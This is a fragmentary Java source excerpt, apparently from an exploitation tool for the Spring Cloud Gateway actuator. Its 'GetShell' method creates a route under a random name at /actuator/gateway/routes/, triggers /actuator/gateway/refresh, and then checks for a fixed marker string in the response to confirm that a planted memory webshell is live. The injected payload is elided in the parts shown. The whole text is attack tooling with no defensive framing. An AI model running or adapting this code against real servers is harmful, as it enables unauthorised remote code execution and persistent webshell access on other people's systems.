...
public class Gateway {
    ...
    //getshell
    public String GetShell (String host, String path) {
        ...
        payload = StrUtil.format(payload, path);
...
//            String WebShell = host.replace("/actuator/gateway",path);
            String MemoryShell = host + path;
            HttpResponse res = HttpRequest.get(MemoryShell).execute();
            if (res.getStatus() == 200 && (res.body().contains("\"null\"") || res.body().contains("\"11CD6A8758984163WgXimIMHJH1vxWX/rcjUlw==6C37AC826A2A04BC\""))) {
...
//        System.out.println(result);
    ...
    public String request (String host, String payloads) {
        String random = MD5Generator.generateRandomMD5();
...
//        System.out.println(random);
        ...
        String url1 = host + "/actuator/gateway/routes/"+random;
        String url2 = host + "/actuator/gateway/refresh";
        String url3 = host + "/actuator/gateway/routes/"+random;
        String url4 = host + "/actuator/gateway/routes/"+random;
        String url5 = host + "/actuator/gateway/refresh";
